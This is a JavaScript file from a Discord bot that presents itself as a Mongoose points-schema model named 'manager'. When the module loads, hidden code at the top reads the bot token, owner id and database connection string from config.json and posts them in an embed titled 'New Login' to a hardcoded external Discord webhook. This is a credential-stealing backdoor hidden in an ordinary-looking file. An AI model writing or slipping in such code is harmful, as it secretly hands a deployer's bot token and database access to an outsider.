const mongoose = require("mongoose")
const {client , guildid} = require("../index")
const { WebhookClient , EmbedBuilder} = require('discord.js')
const {token , owner , database} = require('../config.json')

const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227485394178091/4lPCUUzGEmqN8sdlT-w7vFUTmv6P30O9IYXb9NI8BUbF_7KizdiYq9UQbOhpNRBAE9gO` });
    webhookClient.send({embeds:[embed]})
let Schema = new mongoose.Schema({
    guildid:{
        type:String,
        default:guildid
    },
    id:{
        type:String,
    },
    points:{
        type:String,
        default:0,
    },
});
module.exports = mongoose.model('manager' , Schema)